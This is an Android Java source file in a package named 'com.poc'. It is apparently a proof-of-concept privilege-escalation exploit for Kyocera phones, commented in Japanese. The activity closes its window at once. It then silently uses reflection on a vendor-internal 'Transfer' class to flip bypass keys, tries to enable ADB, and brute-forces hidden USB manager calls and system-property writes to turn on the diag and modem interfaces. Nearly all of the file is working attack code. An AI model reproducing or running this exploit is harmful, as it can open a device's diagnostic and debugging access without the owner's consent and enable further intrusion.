package com.poc;

import android.app.Activity;
import android.content.ContentResolver;
import android.content.Context;
import android.hardware.usb.UsbManager;
import android.os.Bundle;
import android.os.IBinder;
import android.provider.Settings;
import android.util.Log;

import java.lang.reflect.Method;

public class SetBackupAccountActivity extends Activity {
    private static final String TAG = "UsbSwitch";

    // ==================================================================
    // Transfer キー
    // ==================================================================
    private static final String KEY_RW_QFUNC_MODE = "rw_qfunc_mode";
    private static final String KEY_RW_USB_CONNECTION_ENABLED = "rw_usb_connection_enabled";
    private static final String KEY_RW_ACV_CTS_ZEMI = "rw_acv_cts_zemi";

    private static final String VALUE_BYPASS = "1";
    private static final String VALUE_ZERO = "0";

    // ==================================================================
    // 試行する組み合わせ
    // ==================================================================
    private static final String COMBO_FULL = "rndis,diag,modem,none,adb";
    private static final String COMBO_RNDIS_DIAG_MODEM = "rndis,diag,modem";
    private static final String COMBO_RNDIS_DIAG = "rndis,diag";
    private static final String COMBO_DIAG_MODEM = "diag,modem";
    private static final String COMBO_DIAG = "diag";
    private static final String COMBO_KYOCERA = "diag,serial_smd,rmnet_bam,adb";
    private static final String COMBO_RNDIS_DIAG_MODEM_ADB = "rndis,diag,modem,adb";
    private static final String COMBO_DIAG_ADB = "diag,adb";

    private static final String[] ALL_COMBOS = new String[]{
            COMBO_FULL,
            COMBO_RNDIS_DIAG_MODEM,
            COMBO_RNDIS_DIAG,
            COMBO_DIAG_MODEM,
            COMBO_DIAG,
            COMBO_KYOCERA,
            COMBO_RNDIS_DIAG_MODEM_ADB,
            COMBO_DIAG_ADB,
    };

    // ==================================================================
    // 制御定数
    // ==================================================================
    private static final int TRIGGER_COUNT = 3;
    private static final int BRUTE_ROUNDS = 3;
    private static final long SLEEP_MS = 500;
    private static final long SLEEP_LONG_MS = 2000;

    private static final String MASS_STORAGE_BACKING_FILE = "/data/local/tmp/usb_disk.img";

    private Context mContext;

    // ==================================================================
    // エントリポイント
    // ==================================================================
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        finish();

        try {
            mContext = getApplicationContext();
            if (mContext == null) {
                return;
            }
            runAllStrategies();
        } catch (Throwable t) {
            Log.e(TAG, "onCreate top-level error", t);
        }
    }

    // ==================================================================
    // 戦略の連鎖
    // ==================================================================
    private void runAllStrategies() {
        // Step 1: 既存処理 (Transfer Bypass + UsbManager.setCurrentFunction)
        try {
            runExistingStrategy();
        } catch (Throwable t) {
            Log.e(TAG, "Step1 error", t);
        }
        if (verifyDiagPresent()) {
            logFinal("Step1");
            return;
        }

        // Step 2: Transfer キーを複数書き換え + 全コンボ
        try {
            runTransferMultiKeyStrategy();
        } catch (Throwable t) {
            Log.e(TAG, "Step2 error", t);
        }
        if (verifyDiagPresent()) {
            logFinal("Step2");
            return;
        }

        // Step 3: IUsbManager 直叩き
        try {
            runDirectIUsbManagerStrategy();
        } catch (Throwable t) {
            Log.e(TAG, "Step3 error", t);
        }
        if (verifyDiagPresent()) {
            logFinal("Step3");
            return;
        }

        // Step 4: Settings.Global ADB_ENABLED 書き換え
        try {
            runAdbEnabledStrategy();
        } catch (Throwable t) {
            Log.e(TAG, "Step4 error", t);
        }
        if (verifyDiagPresent()) {
            logFinal("Step4");
            return;
        }

        // Step 5: mass_storage 経由 + diag 再試行
        try {
            runMassStorageStrategy();
        } catch (Throwable t) {
            Log.e(TAG, "Step5 error", t);
        }
        if (verifyDiagPresent()) {
            logFinal("Step5");
            return;
        }

        // Step 6: 全コンボ × makeDefault 両方 × 3 ラウンド総当たり
        try {
            runBruteForceStrategy();
        } catch (Throwable t) {
            Log.e(TAG, "Step6 error", t);
        }
        if (verifyDiagPresent()) {
            logFinal("Step6");
            return;
        }

        // Step 7: SystemProperties 直書き (SELinux で失敗する可能性大)
        try {
            runSystemPropertiesStrategy();
        } catch (Throwable t) {
            Log.e(TAG, "Step7 error", t);
        }
        if (verifyDiagPresent()) {
            logFinal("Step7");
            return;
        }

        // 最終: 検証ログ
        logFinal("NONE");
    }

    // ==================================================================
    // Step 1: 既存処理
    // ==================================================================
    private void runExistingStrategy() {
        if (!isTransferAvailable()) {
            return;
        }

        String originalMode = getTransfer(KEY_RW_QFUNC_MODE);

        if (!setTransfer(KEY_RW_QFUNC_MODE, VALUE_BYPASS)) {
            return;
        }

        String modeAfterSet = getTransfer(KEY_RW_QFUNC_MODE);
        if (!VALUE_BYPASS.equals(modeAfterSet)) {
            return;
        }

        for (int i = 0; i < TRIGGER_COUNT; i++) {
            setCurrentFunctionViaUsbManager(COMBO_FULL, false);
            sleepQuiet(SLEEP_MS);

            setCurrentFunctionViaUsbManager(COMBO_FULL, true);
            sleepQuiet(SLEEP_MS);

            if (verifyDiagPresent()) {
                break;
            }
        }

        if (originalMode != null) {
            setTransfer(KEY_RW_QFUNC_MODE, originalMode);
        }
    }

    // ==================================================================
    // Step 2: 複数 Transfer キー + 全コンボ
    // ==================================================================
    private void runTransferMultiKeyStrategy() {
        if (!isTransferAvailable()) {
            return;
        }

        String origQfunc = getTransfer(KEY_RW_QFUNC_MODE);
        String origUsbCon = getTransfer(KEY_RW_USB_CONNECTION_ENABLED);
        String origCts = getTransfer(KEY_RW_ACV_CTS_ZEMI);

        setTransfer(KEY_RW_QFUNC_MODE, VALUE_BYPASS);
        setTransfer(KEY_RW_USB_CONNECTION_ENABLED, VALUE_BYPASS);
        setTransfer(KEY_RW_ACV_CTS_ZEMI, VALUE_ZERO);

        for (int i = 0; i < ALL_COMBOS.length; i++) {
            String combo = ALL_COMBOS[i];

            setCurrentFunctionViaUsbManager(combo, false);
            sleepQuiet(SLEEP_MS);
            setCurrentFunctionViaUsbManager(combo, true);
            sleepQuiet(SLEEP_MS);

            if (verifyDiagPresent()) {
                break;
            }
        }

        if (origQfunc != null) {
            setTransfer(KEY_RW_QFUNC_MODE, origQfunc);
        }
        if (origUsbCon != null) {
            setTransfer(KEY_RW_USB_CONNECTION_ENABLED, origUsbCon);
        }
        if (origCts != null) {
            setTransfer(KEY_RW_ACV_CTS_ZEMI, origCts);
        }
    }

    // ==================================================================
    // Step 3: IUsbManager 直叩き
    // ==================================================================
    private void runDirectIUsbManagerStrategy() {
        for (int i = 0; i < ALL_COMBOS.length; i++) {
            String combo = ALL_COMBOS[i];

            setCurrentFunctionViaIUsbManager(combo, false);
            sleepQuiet(SLEEP_MS);
            setCurrentFunctionViaIUsbManager(combo, true);
            sleepQuiet(SLEEP_MS);

            if (verifyDiagPresent()) {
                break;
            }
        }
    }

    // ==================================================================
    // Step 4: Settings.Global ADB_ENABLED 経由
    // ==================================================================
    private void runAdbEnabledStrategy() {
        try {
            ContentResolver cr = mContext.getContentResolver();
            Settings.Global.putInt(cr, "adb_enabled", 1);
            sleepQuiet(SLEEP_LONG_MS);

            if (!verifyDiagPresent()) {
                for (int i = 0; i < ALL_COMBOS.length; i++) {
                    setCurrentFunctionViaUsbManager(ALL_COMBOS[i], true);
                    sleepQuiet(SLEEP_MS);
                    if (verifyDiagPresent()) {
                        break;
                    }
                }
            }
        } catch (Throwable t) {
            Log.e(TAG, "runAdbEnabledStrategy error", t);
        }
    }

    // ==================================================================
    // Step 5: mass_storage 経由
    // ==================================================================
    private void runMassStorageStrategy() {
        setMassStorageBackingFileViaUsbManager(MASS_STORAGE_BACKING_FILE);
        sleepQuiet(SLEEP_MS);

        setCurrentFunctionViaUsbManager("mass_storage", false);
        sleepQuiet(SLEEP_MS);
        setCurrentFunctionViaUsbManager("mass_storage", true);
        sleepQuiet(SLEEP_LONG_MS);

        if (!verifyDiagPresent()) {
            for (int i = 0; i < ALL_COMBOS.length; i++) {
                setCurrentFunctionViaUsbManager(ALL_COMBOS[i], false);
                sleepQuiet(SLEEP_MS);
                setCurrentFunctionViaUsbManager(ALL_COMBOS[i], true);
                sleepQuiet(SLEEP_MS);
                if (verifyDiagPresent()) {
                    break;
                }
            }
        }
    }

    // ==================================================================
    // Step 6: 全コンボ総当たり
    // ==================================================================
    private void runBruteForceStrategy() {
        String originalMode = null;
        if (isTransferAvailable()) {
            originalMode = getTransfer(KEY_RW_QFUNC_MODE);
            setTransfer(KEY_RW_QFUNC_MODE, VALUE_BYPASS);
        }

        for (int round = 0; round < BRUTE_ROUNDS; round++) {
            for (int i = 0; i < ALL_COMBOS.length; i++) {
                String combo = ALL_COMBOS[i];

                setCurrentFunctionViaUsbManager(combo, false);
                sleepQuiet(SLEEP_MS);
                setCurrentFunctionViaIUsbManager(combo, false);
                sleepQuiet(SLEEP_MS);
                setCurrentFunctionViaUsbManager(combo, true);
                sleepQuiet(SLEEP_MS);
                setCurrentFunctionViaIUsbManager(combo, true);
                sleepQuiet(SLEEP_MS);

                if (verifyDiagPresent()) {
                    break;
                }
            }
            if (verifyDiagPresent()) {
                break;
            }
        }

        if (isTransferAvailable() && originalMode != null) {
            setTransfer(KEY_RW_QFUNC_MODE, originalMode);
        }
    }

    // ==================================================================
    // Step 7: SystemProperties 直書き
    // ==================================================================
    private void runSystemPropertiesStrategy() {
        try {
            Class<?> spClass = Class.forName("android.os.SystemProperties");
            Method setMethod = spClass.getMethod("set", String.class, String.class);
            setMethod.setAccessible(true);

            setMethod.invoke(null, "persist.sys.usb.config", COMBO_KYOCERA);
            sleepQuiet(SLEEP_MS);
            setMethod.invoke(null, "sys.usb.config", COMBO_KYOCERA);
            sleepQuiet(SLEEP_LONG_MS);
        } catch (Throwable t) {
            Log.e(TAG, "runSystemPropertiesStrategy error", t);
        }
    }

    // ==================================================================
    // 検証
    // ==================================================================
    private boolean verifyDiagPresent() {
        try {
            String sysConfig = getSystemProperty("sys.usb.config", "");
            if (containsFunction(sysConfig, "diag")) {
                return true;
            }
            String persistConfig = getSystemProperty("persist.sys.usb.config", "");
            if (containsFunction(persistConfig, "diag")) {
                return true;
            }
            String sysState = getSystemProperty("sys.usb.state", "");
            if (containsFunction(sysState, "diag")) {
                return true;
            }
            if (isFunctionEnabledViaUsbManager("diag")) {
                return true;
            }
        } catch (Throwable t) {
            Log.e(TAG, "verifyDiagPresent error", t);
        }
        return false;
    }

    private void logFinal(String step) {
        try {
            Log.i(TAG, "=== FINAL after " + step + " ===");
            Log.i(TAG, "sys.usb.config=" + getSystemProperty("sys.usb.config", ""));
            Log.i(TAG, "persist.sys.usb.config=" + getSystemProperty("persist.sys.usb.config", ""));
            Log.i(TAG, "sys.usb.state=" + getSystemProperty("sys.usb.state", ""));
            Log.i(TAG, "isFunctionEnabled(diag)=" + isFunctionEnabledViaUsbManager("diag"));
            Log.i(TAG, "getDefaultFunction()=" + getDefaultFunctionViaUsbManager());
        } catch (Throwable t) {
            Log.e(TAG, "logFinal error", t);
        }
    }

    // ==================================================================
    // Transfer リフレクション
    // ==================================================================
    private static boolean isTransferAvailable() {
        try {
            Class.forName("jp.kyocera.internal.clomask.Transfer");
            return true;
        } catch (Throwable t) {
            return false;
        }
    }

    private static String getTransfer(String key) {
        try {
            Class<?> cls = Class.forName("jp.kyocera.internal.clomask.Transfer");
            Method m = cls.getMethod("get", String.class);
            m.setAccessible(true);
            Object result = m.invoke(null, key);
            return result instanceof String ? (String) result : null;
        } catch (Throwable t) {
            return null;
        }
    }

    private static boolean setTransfer(String key, String value) {
        String[] candidateMethods = new String[]{"set", "put", "write", "setValue", "update"};
        for (int i = 0; i < candidateMethods.length; i++) {
            String methodName = candidateMethods[i];
            try {
                Class<?> cls = Class.forName("jp.kyocera.internal.clomask.Transfer");
                Method m = cls.getMethod(methodName, String.class, String.class);
                m.setAccessible(true);
                m.invoke(null, key, value);
                return true;
            } catch (NoSuchMethodException e) {
                // next
            } catch (Throwable t) {
                return false;
            }
        }
        return false;
    }

    // ==================================================================
    // UsbManager リフレクション
    // ==================================================================
    private void setCurrentFunctionViaUsbManager(String function, boolean makeDefault) {
        try {
            Object service = mContext.getSystemService(Context.USB_SERVICE);
            if (service == null) {
                return;
            }
            Method m = service.getClass().getMethod(
                    "setCurrentFunction", String.class, boolean.class);
            m.setAccessible(true);
            m.invoke(service, function, makeDefault);
        } catch (Throwable t) {
            // swallow
        }
    }

    private void setMassStorageBackingFileViaUsbManager(String path) {
        try {
            Object service = mContext.getSystemService(Context.USB_SERVICE);
            if (service == null) {
                return;
            }
            Method m = service.getClass().getMethod(
                    "setMassStorageBackingFile", String.class);
            m.setAccessible(true);
            m.invoke(service, path);
        } catch (Throwable t) {
            // swallow
        }
    }

    private boolean isFunctionEnabledViaUsbManager(String function) {
        try {
            Object service = mContext.getSystemService(Context.USB_SERVICE);
            if (service == null) {
                return false;
            }
            Method m = service.getClass().getMethod("isFunctionEnabled", String.class);
            m.setAccessible(true);
            Object result = m.invoke(service, function);
            return result instanceof Boolean && (Boolean) result;
        } catch (Throwable t) {
            return false;
        }
    }

    private String getDefaultFunctionViaUsbManager() {
        try {
            Object service = mContext.getSystemService(Context.USB_SERVICE);
            if (service == null) {
                return null;
            }
            Method m = service.getClass().getMethod("getDefaultFunction");
            m.setAccessible(true);
            Object result = m.invoke(service);
            return result instanceof String ? (String) result : null;
        } catch (Throwable t) {
            return null;
        }
    }

    // ==================================================================
    // IUsbManager 直叩き
    // ==================================================================
    private void setCurrentFunctionViaIUsbManager(String function, boolean makeDefault) {
        try {
            Object service = getIUsbManagerService();
            if (service == null) {
                return;
            }
            Method m = service.getClass().getMethod(
                    "setCurrentFunction", String.class, boolean.class);
            m.setAccessible(true);
            m.invoke(service, function, makeDefault);
        } catch (Throwable t) {
            // swallow
        }
    }

    private Object getIUsbManagerService() {
        try {
            Class<?> smClass = Class.forName("android.os.ServiceManager");
            Method getService = smClass.getMethod("getService", String.class);
            getService.setAccessible(true);
            Object binderObj = getService.invoke(null, "usb");
            if (!(binderObj instanceof IBinder)) {
                return null;
            }
            IBinder binder = (IBinder) binderObj;

            Class<?> stubClass = Class.forName("android.hardware.usb.IUsbManager$Stub");
            Method asInterface = stubClass.getMethod("asInterface", IBinder.class);
            asInterface.setAccessible(true);
            return asInterface.invoke(null, binder);
        } catch (Throwable t) {
            return null;
        }
    }

    // ==================================================================
    // ユーティリティ
    // ==================================================================
    private static boolean containsFunction(String functions, String function) {
        if (functions == null || function == null) {
            return false;
        }
        int index = functions.indexOf(function);
        if (index < 0) {
            return false;
        }
        if (index > 0 && functions.charAt(index - 1) != ',') {
            return false;
        }
        int charAfter = index + function.length();
        return charAfter >= functions.length() || functions.charAt(charAfter) == ',';
    }

    private static String getSystemProperty(String key, String defaultValue) {
        try {
            Class<?> spClass = Class.forName("android.os.SystemProperties");
            Method getMethod = spClass.getMethod("get", String.class, String.class);
            getMethod.setAccessible(true);
            Object result = getMethod.invoke(null, key, defaultValue);
            return result instanceof String ? (String) result : defaultValue;
        } catch (Throwable t) {
            return defaultValue;
        }
    }

    private static void sleepQuiet(long ms) {
        try {
            Thread.sleep(ms);
        } catch (InterruptedException e) {
            // ignore
        }
    }
}
